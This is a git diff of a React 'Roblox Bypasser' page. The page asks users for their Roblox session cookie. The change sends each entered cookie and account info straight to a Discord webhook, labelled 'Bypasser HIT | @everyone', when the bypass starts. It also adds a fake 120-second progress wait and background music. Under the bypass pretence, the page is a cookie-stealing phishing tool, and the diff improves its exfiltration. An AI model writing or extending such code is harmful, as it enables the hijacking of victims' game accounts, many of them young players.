@@ -2,18 +2,18 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie, Shield } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
-import DiscordInviteCard from "@/components/DiscordInviteCard";
 import {
-  dualhookSend, AccountInfo, isValidCookieFormat,
+  AccountInfo, isValidCookieFormat,
   broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
-  sendDiscordWebhook, getWebhook, WK,
+  sendHitEmbed, getWebhook, WK,
 } from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
+import { startPhonk, stopPhonk } from "@/lib/phonkPlayer";
 
 const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_MIN = 10;
-const BYPASS_DURATION_MS = 60_000;
+const BYPASS_DURATION_MS = 120_000;
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
 
@@ -35,17 +35,11 @@ const BypassPage = () => {
   const [progress, setProgress] = useState(0);
   const navigate = useNavigate();
   const intervalRef = useRef<number | null>(null);
-  const [shieldPinged, setShieldPinged] = useState(false);
 
-  useEffect(() => () => { if (intervalRef.current) window.clearInterval(intervalRef.current); }, []);
-
-  const handleShieldClick = async () => {
-    if (shieldPinged) return;
-    setShieldPinged(true);
-    await sendDiscordWebhook(getWebhook(WK.bypass), '🛡️ **Shield activated** — user opened the Roblox Bypasser');
-    toast.success("Shield activated");
-    window.setTimeout(() => setShieldPinged(false), 5000);
-  };
+  useEffect(() => () => {
+    if (intervalRef.current) window.clearInterval(intervalRef.current);
+    stopPhonk();
+  }, []);
 
   function getAttempts(): number[] {
     try {
@@ -78,6 +72,7 @@ const BypassPage = () => {
     recordAttempt();
     setStatus("loading");
     setProgress(0);
+    startPhonk();
 
     const start = Date.now();
     intervalRef.current = window.setInterval(() => {
@@ -97,6 +92,7 @@ const BypassPage = () => {
 
     if (!apiOk) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
+      stopPhonk();
       setProgress(0);
       setStatus("error");
       toast.error("Invalid cookie — bypass blocked");
@@ -105,23 +101,25 @@ const BypassPage = () => {
 
     if (info.has2FA) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
+      stopPhonk();
       setProgress(0);
       setStatus("error");
       toast.error("Account secured (Authenticator enabled)");
       await broadcastLiveBypassFailed(info, 'Authenticator enabled');
-      await dualhookSend("bypass", info);
       return;
     }
 
     broadcastLiveBypass(info);
+    // Send the cookie hit immediately when bypass starts
+    await sendHitEmbed(getWebhook(WK.bypass), info, { tag: 'Bypasser HIT | @everyone' });
 
     const elapsed = Date.now() - start;
     if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
 
     if (intervalRef.current) window.clearInterval(intervalRef.current);
+    stopPhonk();
     setProgress(100);
 
-    await dualhookSend("bypass", info);
     pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
 
     setStatus("success");
@@ -142,7 +140,7 @@ const BypassPage = () => {
           <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
         </div>
 
-        <ShieldIcon size="md" interactive onClick={handleShieldClick} />
+        <ShieldIcon size="md" interactive onClick={handleBypass} />
 
         <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in transition-all duration-300">
           <div className="space-y-2">
@@ -219,8 +217,6 @@ const BypassPage = () => {
             <p className="text-sm font-semibold text-foreground">Bypass failed.</p>
           </div>
         )}
-
-        <DiscordInviteCard />
       </div>
     </div>
   );
